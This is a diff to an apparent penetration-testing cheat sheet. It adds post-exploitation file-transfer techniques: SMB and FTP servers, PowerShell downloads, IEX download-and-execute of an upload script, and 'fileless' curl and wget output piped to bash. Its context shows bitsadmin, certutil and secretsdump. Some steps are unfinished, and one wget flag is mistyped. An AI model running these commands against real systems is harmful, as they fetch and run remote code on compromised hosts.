@@ -364,7 +364,7 @@ secretsdump.py <domain>/<user>:<password>@<IP>
   ## ZeroLogon
 
 ## File Transfers
-### Windows File Transfers
+### Windows File Downloads
 #### Powershell
   * Powershell File Download with DownloadFile
   ```Powershell
@@ -388,9 +388,47 @@ secretsdump.py <domain>/<user>:<password>@<IP>
   ```Powershell
   (New-Object Net.WebClient).DownloadString('<Target File URL>') | IEX
   ```
+#### SMB
+  1. Start an SMB server
+  ```sh
+  smbserver.py <share> -smb2support <path to files>
+  ```
+  2. Copy Files
+  ```cmd
+  copy \\<IP>\<share>\<file>
+  ```
+  If unauthenticated guest access is blocked do the following:
+  
+  1. start an SMB Server with login
+  ```sh
+  smbserver.py <share> -smb2support <path to files> -user <user> -password <pass>
+  ```
+  2. Mount the SMB Server
+  ```cmd
+  net use n: \\<ip>\<share> /user:<user> <pass>
+  ```
+#### FTP
+  1. Start the FTP Server
+  ```sh
+  python3 -m pyftpdlib --port 21
+  ```
+  2. Download the files with Powershell
+  ```sh
+  (New-Object Net.WebClient).DownloadFile('ftp://<IP>/<file>', '<file>')
+  ```
+
+### Windows File Uploads
+  1. start a python upload server
+  ```sh
+  python3 -m uploadserver
+  ```
+  2. Transfer PSUpload.ps1 to the Windows Machine
+  ```powershell
+  IEX(New-Object Net.WebClient).DownloadString('<path to PSUpload.ps1>')
+  ```
+  3.
   
 #### LOLBAS
-  
 ##### Bitsadmin from Powershell
 ```powershell
 bitsadmin /transfer wcb /priority foreground http://<host>/<file> C:\Users\<User>\Desktop\<file>
@@ -405,6 +443,23 @@ certutil.exe -verifyctl -split -f http://<host>/<file>
 ```
 
 ### Linux File Transfers
+#### Downloads with Wget
+```sh
+wget <Target File URL> -O <path/to/file_save>
+```
+#### Download with Curl
+```sh
+curl -o <path/to/file_save> <Target File URL>
+```
+#### Fileless Attacks with curl
+```sh
+curl <Target File URL> | bash
+```
+#### Fileless Attacks with wget
+```sh
+wget -q0- <Target File URL> | bash
+```
+
 #### GTFOBINS
 ##### openssl
   1. Create a Certificate on the server machine
@@ -419,8 +474,9 @@ certutil.exe -verifyctl -split -f http://<host>/<file>
   ```sh
   openssl s_client -connect <host>:<port> -quiet > <file>
   ```
+#### File Uploads
   
-
+  
 ### Pivoting
 ### 
 
